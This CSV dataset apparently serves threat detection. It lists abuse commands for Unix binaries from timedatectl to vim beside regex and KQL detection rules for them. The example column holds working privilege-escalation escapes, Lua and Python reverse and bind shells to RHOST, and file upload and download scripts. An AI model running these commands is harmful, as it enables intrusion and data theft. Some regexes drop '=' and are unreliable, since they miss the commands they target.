Name,Function,ExampleCode,KeywordsExtracted,RegexFuzzyV7,RegexFuzzyV7_KQL,Notes
timedatectl,sudo,"sudo timedatectl list-timezones
!/bin/sh",sudo list-timezones /bin/sh,(?i)\b(?:\S*/)?timedatectl.*sudo.*list\-timezones.*/bin/sh,"@""(?i)\b(?:\S*/)?timedatectl.*sudo.*list\-timezones.*/bin/sh""",
timeout,shell,timeout 7d /bin/sh,/bin/sh,(?i)\b(?:\S*/)?timeout.*/bin/sh,"@""(?i)\b(?:\S*/)?timeout.*/bin/sh""",
timeout,suid,./timeout 7d /bin/sh -p,/bin/sh /timeout,(?i)\b(?:\S*/)?timeout.*/bin/sh.*/timeout,"@""(?i)\b(?:\S*/)?timeout.*/bin/sh.*/timeout""",
timeout,sudo,sudo timeout --foreground 7d /bin/sh,sudo --foreground /bin/sh,(?i)\b(?:\S*/)?timeout.*sudo.*\-\-foreground.*/bin/sh,"@""(?i)\b(?:\S*/)?timeout.*sudo.*\-\-foreground.*/bin/sh""",
tmate,shell,tmate -c /bin/sh,/bin/sh,(?i)\b(?:\S*/)?tmate.*/bin/sh,"@""(?i)\b(?:\S*/)?tmate.*/bin/sh""",
tmate,sudo,sudo tmate -c /bin/sh,sudo /bin/sh,(?i)\b(?:\S*/)?tmate.*sudo.*/bin/sh,"@""(?i)\b(?:\S*/)?tmate.*sudo.*/bin/sh""",
tmate,limited-suid,./tmate -c /bin/sh,/bin/sh /tmate,(?i)\b(?:\S*/)?tmate.*/bin/sh.*/tmate,"@""(?i)\b(?:\S*/)?tmate.*/bin/sh.*/tmate""",
tmux,file-read,tmux -f $LFILE,,(?i)\b(?:\S*/)?tmux\b,"@""(?i)\b(?:\S*/)?tmux\b""",
tmux,shell,tmux,,(?i)\b(?:\S*/)?tmux\b,"@""(?i)\b(?:\S*/)?tmux\b""",
tmux,shell,tmux -S /path/to/socket_name,/path/to/socket_name,(?i)\b(?:\S*/)?tmux.*/path/to/socket_name,"@""(?i)\b(?:\S*/)?tmux.*/path/to/socket_name""",
tmux,sudo,sudo tmux,sudo,(?i)\b(?:\S*/)?tmux.*sudo,"@""(?i)\b(?:\S*/)?tmux.*sudo""",
top,shell,"echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc
top
# press return twice
reset",echo pipe texec /bin/sh /.config/procps/toprc press return twice reset,(?i)\b(?:\S*/)?top.*echo.*pipe.*texec.*/bin/sh.*/\.config/procps/toprc.*press.*return.*twice,"@""(?i)\b(?:\S*/)?top.*echo.*pipe.*texec.*/bin/sh.*/\.config/procps/toprc.*press.*return.*twice""",
top,sudo,"echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc
sudo top
# press return twice
reset",echo pipe texec /bin/sh /root/.config/procps/toprc sudo press return twice reset,(?i)\b(?:\S*/)?top.*echo.*pipe.*texec.*/bin/sh.*/root/\.config/procps/toprc.*sudo.*press.*return,"@""(?i)\b(?:\S*/)?top.*echo.*pipe.*texec.*/bin/sh.*/root/\.config/procps/toprc.*sudo.*press.*return""",
torify,shell,torify /bin/sh,/bin/sh,(?i)\b(?:\S*/)?torify.*/bin/sh,"@""(?i)\b(?:\S*/)?torify.*/bin/sh""",
torify,sudo,sudo torify /bin/sh,sudo /bin/sh,(?i)\b(?:\S*/)?torify.*sudo.*/bin/sh,"@""(?i)\b(?:\S*/)?torify.*sudo.*/bin/sh""",
torsocks,shell,torsocks /bin/sh,/bin/sh,(?i)\b(?:\S*/)?torsocks.*/bin/sh,"@""(?i)\b(?:\S*/)?torsocks.*/bin/sh""",
torsocks,sudo,sudo torsocks /bin/sh,sudo /bin/sh,(?i)\b(?:\S*/)?torsocks.*sudo.*/bin/sh,"@""(?i)\b(?:\S*/)?torsocks.*sudo.*/bin/sh""",
troff,file-read,troff $LFILE,,(?i)\b(?:\S*/)?troff\b,"@""(?i)\b(?:\S*/)?troff\b""",
troff,suid,./troff $LFILE,/troff,(?i)\b(?:\S*/)?troff.*/troff,"@""(?i)\b(?:\S*/)?troff.*/troff""",
troff,sudo,sudo troff $LFILE,sudo,(?i)\b(?:\S*/)?troff.*sudo,"@""(?i)\b(?:\S*/)?troff.*sudo""",
tshark,shell,"echo 'os.execute(""/bin/sh"")' >$TF
tshark -Xlua_script:$TF",echo os.execute /bin/sh -Xlua_script,(?i)\b(?:\S*/)?tshark.*echo.*os\.execute.*/bin/sh.*\-Xlua_script,"@""(?i)\b(?:\S*/)?tshark.*echo.*os\.execute.*/bin/sh.*\-Xlua_script""",
ul,file-read,"ul ""$LFILE""",,(?i)\b(?:\S*/)?ul\b,"@""(?i)\b(?:\S*/)?ul\b""",
ul,suid,"./ul ""$LFILE""",,(?i)\b(?:\S*/)?ul\b,"@""(?i)\b(?:\S*/)?ul\b""",
ul,sudo,"sudo ul ""$LFILE""",sudo,(?i)\b(?:\S*/)?ul.*sudo,"@""(?i)\b(?:\S*/)?ul.*sudo""",
unexpand,file-read,"unexpand -t99999999 ""$LFILE""",,(?i)\b(?:\S*/)?unexpand\b,"@""(?i)\b(?:\S*/)?unexpand\b""",
unexpand,suid,"./unexpand -t99999999 ""$LFILE""",/unexpand,(?i)\b(?:\S*/)?unexpand.*/unexpand,"@""(?i)\b(?:\S*/)?unexpand.*/unexpand""",
unexpand,sudo,"sudo unexpand -t99999999 ""$LFILE""",sudo,(?i)\b(?:\S*/)?unexpand.*sudo,"@""(?i)\b(?:\S*/)?unexpand.*sudo""",
uniq,file-read,"uniq ""$LFILE""",,(?i)\b(?:\S*/)?uniq\b,"@""(?i)\b(?:\S*/)?uniq\b""",
uniq,suid,"./uniq ""$LFILE""",/uniq,(?i)\b(?:\S*/)?uniq.*/uniq,"@""(?i)\b(?:\S*/)?uniq.*/uniq""",
uniq,sudo,"sudo uniq ""$LFILE""",sudo,(?i)\b(?:\S*/)?uniq.*sudo,"@""(?i)\b(?:\S*/)?uniq.*sudo""",
unshare,shell,unshare /bin/sh,/bin/sh,(?i)\b(?:\S*/)?unshare.*/bin/sh,"@""(?i)\b(?:\S*/)?unshare.*/bin/sh""",
unshare,suid,./unshare -r /bin/sh,/bin/sh /unshare,(?i)\b(?:\S*/)?unshare.*/bin/sh.*/unshare,"@""(?i)\b(?:\S*/)?unshare.*/bin/sh.*/unshare""",
unshare,sudo,sudo unshare /bin/sh,sudo /bin/sh,(?i)\b(?:\S*/)?unshare.*sudo.*/bin/sh,"@""(?i)\b(?:\S*/)?unshare.*sudo.*/bin/sh""",
unsquashfs,sudo,"sudo unsquashfs shell
./squashfs-root/sh -p",sudo shell ./squashfs-root/sh /squashfs-root/sh,(?i)\b(?:\S*/)?unsquashfs.*sudo.*shell.*\./squashfs\-root/sh.*/squashfs\-root/sh,"@""(?i)\b(?:\S*/)?unsquashfs.*sudo.*shell.*\./squashfs\-root/sh.*/squashfs\-root/sh""",
unsquashfs,suid,"./unsquashfs shell
./squashfs-root/sh -p",shell ./squashfs-root/sh /unsquashfs /squashfs-root/sh,(?i)\b(?:\S*/)?unsquashfs.*shell.*\./squashfs\-root/sh.*/unsquashfs.*/squashfs\-root/sh,"@""(?i)\b(?:\S*/)?unsquashfs.*shell.*\./squashfs\-root/sh.*/unsquashfs.*/squashfs\-root/sh""",
unzip,sudo,"sudo unzip -K shell.zip
./sh -p",sudo shell.zip,(?i)\b(?:\S*/)?unzip.*sudo.*shell\.zip,"@""(?i)\b(?:\S*/)?unzip.*sudo.*shell\.zip""",
unzip,suid,"./unzip -K shell.zip
./sh -p",shell.zip /unzip,(?i)\b(?:\S*/)?unzip.*shell\.zip.*/unzip,"@""(?i)\b(?:\S*/)?unzip.*shell\.zip.*/unzip""",
update-alternatives,sudo,"echo DATA >$TF
sudo update-alternatives --force --install ""$LFILE"" x ""$TF"" 0",echo sudo --force --install,(?i)\b(?:\S*/)?update\-alternatives.*echo.*sudo.*\-\-force.*\-\-install,"@""(?i)\b(?:\S*/)?update\-alternatives.*echo.*sudo.*\-\-force.*\-\-install""",
update-alternatives,suid,"echo DATA >$TF
./update-alternatives --force --install ""$LFILE"" x ""$TF"" 0",echo --force --install /update-alternatives,(?i)\b(?:\S*/)?update\-alternatives.*echo.*\-\-force.*\-\-install.*/update\-alternatives,"@""(?i)\b(?:\S*/)?update\-alternatives.*echo.*\-\-force.*\-\-install.*/update\-alternatives""",
uudecode,file-read,"uuencode ""$LFILE"" /dev/stdout | uudecode",uuencode /dev/stdout,(?i)\b(?:\S*/)?uudecode.*uuencode.*/dev/stdout,"@""(?i)\b(?:\S*/)?uudecode.*uuencode.*/dev/stdout""",
uudecode,suid,"uuencode ""$LFILE"" /dev/stdout | uudecode",uuencode /dev/stdout,(?i)\b(?:\S*/)?uudecode.*uuencode.*/dev/stdout,"@""(?i)\b(?:\S*/)?uudecode.*uuencode.*/dev/stdout""",
uudecode,sudo,"sudo uuencode ""$LFILE"" /dev/stdout | uudecode",sudo uuencode /dev/stdout,(?i)\b(?:\S*/)?uudecode.*sudo.*uuencode.*/dev/stdout,"@""(?i)\b(?:\S*/)?uudecode.*sudo.*uuencode.*/dev/stdout""",
uuencode,file-read,"uuencode ""$LFILE"" /dev/stdout | uudecode",/dev/stdout uudecode,(?i)\b(?:\S*/)?uuencode.*/dev/stdout.*uudecode,"@""(?i)\b(?:\S*/)?uuencode.*/dev/stdout.*uudecode""",
uuencode,suid,"uuencode ""$LFILE"" /dev/stdout | uudecode",/dev/stdout uudecode,(?i)\b(?:\S*/)?uuencode.*/dev/stdout.*uudecode,"@""(?i)\b(?:\S*/)?uuencode.*/dev/stdout.*uudecode""",
uuencode,sudo,"sudo uuencode ""$LFILE"" /dev/stdout | uudecode",sudo /dev/stdout uudecode,(?i)\b(?:\S*/)?uuencode.*sudo.*/dev/stdout.*uudecode,"@""(?i)\b(?:\S*/)?uuencode.*sudo.*/dev/stdout.*uudecode""",
vagrant,shell,"cd $(mktemp -d)
echo 'exec ""/bin/sh""' > Vagrantfile
vagrant up",mktemp echo exec /bin/sh Vagrantfile,(?i)\b(?:\S*/)?vagrant.*mktemp.*echo.*exec.*/bin/sh.*Vagrantfile,"@""(?i)\b(?:\S*/)?vagrant.*mktemp.*echo.*exec.*/bin/sh.*Vagrantfile""",
vagrant,sudo,"cd $(mktemp -d)
echo 'exec ""/bin/sh""' > Vagrantfile
vagrant up",mktemp echo exec /bin/sh Vagrantfile,(?i)\b(?:\S*/)?vagrant.*mktemp.*echo.*exec.*/bin/sh.*Vagrantfile,"@""(?i)\b(?:\S*/)?vagrant.*mktemp.*echo.*exec.*/bin/sh.*Vagrantfile""",
vagrant,suid,"cd $(mktemp -d)
echo 'exec ""/bin/sh -p""' > Vagrantfile
vagrant up",mktemp echo exec /bin/sh Vagrantfile,(?i)\b(?:\S*/)?vagrant.*mktemp.*echo.*exec.*/bin/sh.*Vagrantfile,"@""(?i)\b(?:\S*/)?vagrant.*mktemp.*echo.*exec.*/bin/sh.*Vagrantfile""",
valgrind,shell,valgrind /bin/sh,/bin/sh,(?i)\b(?:\S*/)?valgrind.*/bin/sh,"@""(?i)\b(?:\S*/)?valgrind.*/bin/sh""",
valgrind,sudo,sudo valgrind /bin/sh,sudo /bin/sh,(?i)\b(?:\S*/)?valgrind.*sudo.*/bin/sh,"@""(?i)\b(?:\S*/)?valgrind.*sudo.*/bin/sh""",
varnishncsa,sudo,"sudo varnishncsa -g request -q 'ReqURL ~ ""/xxx""' -F '%{yyy}i' -w ""$LFILE""",sudo request ReqURL /xxx yyy,(?i)\b(?:\S*/)?varnishncsa.*sudo.*request.*ReqURL.*/xxx.*yyy,"@""(?i)\b(?:\S*/)?varnishncsa.*sudo.*request.*ReqURL.*/xxx.*yyy""",
varnishncsa,suid,"./varnishncsa -g request -q 'ReqURL ~ ""/xxx""' -F '%{yyy}i' -w ""$LFILE""",request ReqURL /xxx yyy /varnishncsa,(?i)\b(?:\S*/)?varnishncsa.*request.*ReqURL.*/xxx.*yyy.*/varnishncsa,"@""(?i)\b(?:\S*/)?varnishncsa.*request.*ReqURL.*/xxx.*yyy.*/varnishncsa""",
vi,shell,vi -c ':!/bin/sh' /dev/null,/bin/sh /dev/null,(?i)\b(?:\S*/)?vi.*/bin/sh.*/dev/null,"@""(?i)\b(?:\S*/)?vi.*/bin/sh.*/dev/null""",
vi,shell,"vi
:set shell=/bin/sh
:shell",set shell=/bin/sh shell /bin/sh,(?i)\b(?:\S*/)?vi.*set.*shell/bin/sh.*shell.*/bin/sh,"@""(?i)\b(?:\S*/)?vi.*set.*shell/bin/sh.*shell.*/bin/sh""",
vi,file-write,"vi file_to_write
iDATA
^[
w",iDATA,(?i)\b(?:\S*/)?vi.*iDATA,"@""(?i)\b(?:\S*/)?vi.*iDATA""",
vi,file-read,vi file_to_read,,(?i)\b(?:\S*/)?vi\b,"@""(?i)\b(?:\S*/)?vi\b""",
vi,sudo,sudo vi -c ':!/bin/sh' /dev/null,sudo /bin/sh /dev/null,(?i)\b(?:\S*/)?vi.*sudo.*/bin/sh.*/dev/null,"@""(?i)\b(?:\S*/)?vi.*sudo.*/bin/sh.*/dev/null""",
view,shell,view -c ':!/bin/sh',/bin/sh,(?i)\b(?:\S*/)?view.*/bin/sh,"@""(?i)\b(?:\S*/)?view.*/bin/sh""",
view,shell,"view
:set shell=/bin/sh
:shell",set shell=/bin/sh shell /bin/sh,(?i)\b(?:\S*/)?view.*set.*shell/bin/sh.*shell.*/bin/sh,"@""(?i)\b(?:\S*/)?view.*set.*shell/bin/sh.*shell.*/bin/sh""",
view,shell,"view -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'",import os.execl /bin/sh sh reset exec,(?i)\b(?:\S*/)?view.*import.*os\.execl.*/bin/sh.*sh.*reset.*exec,"@""(?i)\b(?:\S*/)?view.*import.*os\.execl.*/bin/sh.*sh.*reset.*exec""",
view,shell,"view -c ':lua os.execute(""reset; exec sh"")'",lua os.execute reset exec sh,(?i)\b(?:\S*/)?view.*lua.*os\.execute.*reset.*exec.*sh,"@""(?i)\b(?:\S*/)?view.*lua.*os\.execute.*reset.*exec.*sh""",
view,reverse-shell,"view -c ':py import vim,sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")
vim.command("":q!"")'",import vim sys pty s=socket.socket s.connect os.getenv int os.dup2 s.fileno for pty.spawn /bin/sh vim.command,(?i)\b(?:\S*/)?view.*import.*vim.*sys.*pty.*ssocket\.socket.*s\.connect.*os\.getenv.*int,"@""(?i)\b(?:\S*/)?view.*import.*vim.*sys.*pty.*ssocket\.socket.*s\.connect.*os\.getenv.*int""",
view,non-interactive-reverse-shell,"view -c ':lua local s=require(""socket""); local t=assert(s.tcp());
  t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
  while true do
    local r,x=t:receive();local f=assert(io.popen(r,""r""));
    local b=assert(f:read(""*a""));t:send(b);
  end;
  f:close();t:close();'",lua local s=require t=assert s.tcp connect os.getenv while true receive f=assert io.popen b=assert read send end close,(?i)\b(?:\S*/)?view.*lua.*local.*srequire.*tassert.*s\.tcp.*connect.*os\.getenv.*while,"@""(?i)\b(?:\S*/)?view.*lua.*local.*srequire.*tassert.*s\.tcp.*connect.*os\.getenv.*while""",
view,non-interactive-bind-shell,"view -c ':lua local k=require(""socket"");
  local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
  local c=s:accept();
  while true do
    local r,x=c:receive();local f=assert(io.popen(r,""r""));
    local b=assert(f:read(""*a""));c:send(b);
  end;c:close();f:close();'",lua local k=require s=assert k.bind os.getenv accept while true receive f=assert io.popen b=assert read send end close,(?i)\b(?:\S*/)?view.*lua.*local.*krequire.*sassert.*k\.bind.*os\.getenv.*accept.*while,"@""(?i)\b(?:\S*/)?view.*lua.*local.*krequire.*sassert.*k\.bind.*os\.getenv.*accept.*while""",
view,file-upload,"view -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))
vim.command("":q!"")'",import vim sys from environ sys.version_info.major urllib.request urllib.parse else urllib urllib2 r.urlopen bytes u.urlencode open .read .encode vim.command,(?i)\b(?:\S*/)?view.*import.*vim.*sys.*from.*environ.*sys\.version_info\.major.*urllib\.request.*urllib\.parse,"@""(?i)\b(?:\S*/)?view.*import.*vim.*sys.*from.*environ.*sys\.version_info\.major.*urllib\.request.*urllib\.parse""",
view,file-upload,"view -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()
vim.command("":q!"")'",import vim sys from environ sys.version_info.major http.server socketserver else SimpleHTTPServer ss.TCPServer int s.SimpleHTTPRequestHandler .serve_forever vim.command,(?i)\b(?:\S*/)?view.*import.*vim.*sys.*from.*environ.*sys\.version_info\.major.*http\.server.*socketserver,"@""(?i)\b(?:\S*/)?view.*import.*vim.*sys.*from.*environ.*sys\.version_info\.major.*http\.server.*socketserver""",
view,file-upload,"view -c ':lua local f=io.open(os.getenv(""LFILE""), 'rb')
  local d=f:read(""*a"")
  io.close(f);
  local s=require(""socket"");
  local t=assert(s.tcp());
  t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
  t:send(d);
  t:close();'",lua local f=io.open os.getenv read io.close s=require t=assert s.tcp connect send close,(?i)\b(?:\S*/)?view.*lua.*local.*fio\.open.*os\.getenv.*read.*io\.close.*srequire.*tassert,"@""(?i)\b(?:\S*/)?view.*lua.*local.*fio\.open.*os\.getenv.*read.*io\.close.*srequire.*tassert""",
view,file-download,"view -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])
vim.command("":q!"")'",import vim sys from environ sys.version_info.major urllib.request else urllib r.urlretrieve vim.command,(?i)\b(?:\S*/)?view.*import.*vim.*sys.*from.*environ.*sys\.version_info\.major.*urllib\.request.*else,"@""(?i)\b(?:\S*/)?view.*import.*vim.*sys.*from.*environ.*sys\.version_info\.major.*urllib\.request.*else""",
view,file-download,"view -c ':lua local k=require(""socket"");
  local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
  local c=s:accept();
  local d,x=c:receive(""*a"");
  c:close();
  local f=io.open(os.getenv(""LFILE""), ""wb"");
  f:write(d);
  io.close(f);'",lua local k=require s=assert k.bind os.getenv accept receive close f=io.open write io.close,(?i)\b(?:\S*/)?view.*lua.*local.*krequire.*sassert.*k\.bind.*os\.getenv.*accept.*receive,"@""(?i)\b(?:\S*/)?view.*lua.*local.*krequire.*sassert.*k\.bind.*os\.getenv.*accept.*receive""",
view,file-write,"view file_to_write
iDATA
^[
w!",iDATA,(?i)\b(?:\S*/)?view.*iDATA,"@""(?i)\b(?:\S*/)?view.*iDATA""",
view,file-read,view file_to_read,,(?i)\b(?:\S*/)?view\b,"@""(?i)\b(?:\S*/)?view\b""",
view,library-load,"view -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(""lib.so""); vim.command("":q!"")'",import vim from ctypes cdll cdll.LoadLibrary lib.so vim.command,(?i)\b(?:\S*/)?view.*import.*vim.*from.*ctypes.*cdll.*cdll\.LoadLibrary.*lib\.so.*vim\.command,"@""(?i)\b(?:\S*/)?view.*import.*vim.*from.*ctypes.*cdll.*cdll\.LoadLibrary.*lib\.so.*vim\.command""",
view,suid,"./view -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-pc"", ""reset; exec sh -p"")'",import os.execl /bin/sh sh reset exec /view,(?i)\b(?:\S*/)?view.*import.*os\.execl.*/bin/sh.*sh.*reset.*exec.*/view,"@""(?i)\b(?:\S*/)?view.*import.*os\.execl.*/bin/sh.*sh.*reset.*exec.*/view""",
view,sudo,sudo view -c ':!/bin/sh',sudo /bin/sh,(?i)\b(?:\S*/)?view.*sudo.*/bin/sh,"@""(?i)\b(?:\S*/)?view.*sudo.*/bin/sh""",
view,sudo,"sudo view -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'",sudo import os.execl /bin/sh sh reset exec,(?i)\b(?:\S*/)?view.*sudo.*import.*os\.execl.*/bin/sh.*sh.*reset.*exec,"@""(?i)\b(?:\S*/)?view.*sudo.*import.*os\.execl.*/bin/sh.*sh.*reset.*exec""",
view,sudo,"sudo view -c ':lua os.execute(""reset; exec sh"")'",sudo lua os.execute reset exec sh,(?i)\b(?:\S*/)?view.*sudo.*lua.*os\.execute.*reset.*exec.*sh,"@""(?i)\b(?:\S*/)?view.*sudo.*lua.*os\.execute.*reset.*exec.*sh""",
view,capabilities,"./view -c ':py import os; os.setuid(0); os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'",import os.setuid os.execl /bin/sh sh reset exec /view,(?i)\b(?:\S*/)?view.*import.*os\.setuid.*os\.execl.*/bin/sh.*sh.*reset.*exec.*/view,"@""(?i)\b(?:\S*/)?view.*import.*os\.setuid.*os\.execl.*/bin/sh.*sh.*reset.*exec.*/view""",
view,limited-suid,"./view -c ':lua os.execute(""reset; exec sh"")'",lua os.execute reset exec sh /view,(?i)\b(?:\S*/)?view.*lua.*os\.execute.*reset.*exec.*sh.*/view,"@""(?i)\b(?:\S*/)?view.*lua.*os\.execute.*reset.*exec.*sh.*/view""",
vigr,suid,./vigr,/vigr,(?i)\b(?:\S*/)?vigr.*/vigr,"@""(?i)\b(?:\S*/)?vigr.*/vigr""",
vigr,sudo,sudo vigr,sudo,(?i)\b(?:\S*/)?vigr.*sudo,"@""(?i)\b(?:\S*/)?vigr.*sudo""",
vim,shell,vim -c ':!/bin/sh',/bin/sh,(?i)\b(?:\S*/)?vim.*/bin/sh,"@""(?i)\b(?:\S*/)?vim.*/bin/sh""",
vim,shell,vim --cmd ':set shell=/bin/sh|:shell',--cmd set shell=/bin/sh shell /bin/sh,(?i)\b(?:\S*/)?vim.*\-\-cmd.*set.*shell/bin/sh.*shell.*/bin/sh,"@""(?i)\b(?:\S*/)?vim.*\-\-cmd.*set.*shell/bin/sh.*shell.*/bin/sh""",
vim,shell,"vim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'",import os.execl /bin/sh sh reset exec,(?i)\b(?:\S*/)?vim.*import.*os\.execl.*/bin/sh.*sh.*reset.*exec,"@""(?i)\b(?:\S*/)?vim.*import.*os\.execl.*/bin/sh.*sh.*reset.*exec""",
vim,shell,"vim -c ':lua os.execute(""reset; exec sh"")'",lua os.execute reset exec sh,(?i)\b(?:\S*/)?vim.*lua.*os\.execute.*reset.*exec.*sh,"@""(?i)\b(?:\S*/)?vim.*lua.*os\.execute.*reset.*exec.*sh""",
vim,reverse-shell,"vim -c ':py import vim,sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")
vim.command("":q!"")'",import sys pty s=socket.socket s.connect os.getenv int os.dup2 s.fileno for pty.spawn /bin/sh vim.command,(?i)\b(?:\S*/)?vim.*import.*sys.*pty.*ssocket\.socket.*s\.connect.*os\.getenv.*int.*os\.dup2,"@""(?i)\b(?:\S*/)?vim.*import.*sys.*pty.*ssocket\.socket.*s\.connect.*os\.getenv.*int.*os\.dup2""",
vim,non-interactive-reverse-shell,"vim -c ':lua local s=require(""socket""); local t=assert(s.tcp());
  t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
  while true do
    local r,x=t:receive();local f=assert(io.popen(r,""r""));
    local b=assert(f:read(""*a""));t:send(b);
  end;
  f:close();t:close();'",lua local s=require t=assert s.tcp connect os.getenv while true receive f=assert io.popen b=assert read send end close,(?i)\b(?:\S*/)?vim.*lua.*local.*srequire.*tassert.*s\.tcp.*connect.*os\.getenv.*while,"@""(?i)\b(?:\S*/)?vim.*lua.*local.*srequire.*tassert.*s\.tcp.*connect.*os\.getenv.*while""",
vim,non-interactive-bind-shell,"vim -c ':lua local k=require(""socket"");
  local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
  local c=s:accept();
  while true do
    local r,x=c:receive();local f=assert(io.popen(r,""r""));
    local b=assert(f:read(""*a""));c:send(b);
  end;c:close();f:close();'",lua local k=require s=assert k.bind os.getenv accept while true receive f=assert io.popen b=assert read send end close,(?i)\b(?:\S*/)?vim.*lua.*local.*krequire.*sassert.*k\.bind.*os\.getenv.*accept.*while,"@""(?i)\b(?:\S*/)?vim.*lua.*local.*krequire.*sassert.*k\.bind.*os\.getenv.*accept.*while""",
vim,file-upload,"vim -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))
vim.command("":q!"")'",import sys from environ sys.version_info.major urllib.request urllib.parse else urllib urllib2 r.urlopen bytes u.urlencode open .read .encode vim.command,(?i)\b(?:\S*/)?vim.*import.*sys.*from.*environ.*sys\.version_info\.major.*urllib\.request.*urllib\.parse.*else,"@""(?i)\b(?:\S*/)?vim.*import.*sys.*from.*environ.*sys\.version_info\.major.*urllib\.request.*urllib\.parse.*else""",
vim,file-upload,"vim -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()
vim.command("":q!"")'",import sys from environ sys.version_info.major http.server socketserver else SimpleHTTPServer ss.TCPServer int s.SimpleHTTPRequestHandler .serve_forever vim.command,(?i)\b(?:\S*/)?vim.*import.*sys.*from.*environ.*sys\.version_info\.major.*http\.server.*socketserver.*else,"@""(?i)\b(?:\S*/)?vim.*import.*sys.*from.*environ.*sys\.version_info\.major.*http\.server.*socketserver.*else""",
vim,file-upload,"vim -c ':lua local f=io.open(os.getenv(""LFILE""), 'rb')
  local d=f:read(""*a"")
  io.close(f);
  local s=require(""socket"");
  local t=assert(s.tcp());
  t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
  t:send(d);
  t:close();'",lua local f=io.open os.getenv read io.close s=require t=assert s.tcp connect send close,(?i)\b(?:\S*/)?vim.*lua.*local.*fio\.open.*os\.getenv.*read.*io\.close.*srequire.*tassert,"@""(?i)\b(?:\S*/)?vim.*lua.*local.*fio\.open.*os\.getenv.*read.*io\.close.*srequire.*tassert""",
vim,file-download,"vim -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])
vim.command("":q!"")'",import sys from environ sys.version_info.major urllib.request else urllib r.urlretrieve vim.command,(?i)\b(?:\S*/)?vim.*import.*sys.*from.*environ.*sys\.version_info\.major.*urllib\.request.*else.*urllib,"@""(?i)\b(?:\S*/)?vim.*import.*sys.*from.*environ.*sys\.version_info\.major.*urllib\.request.*else.*urllib""",
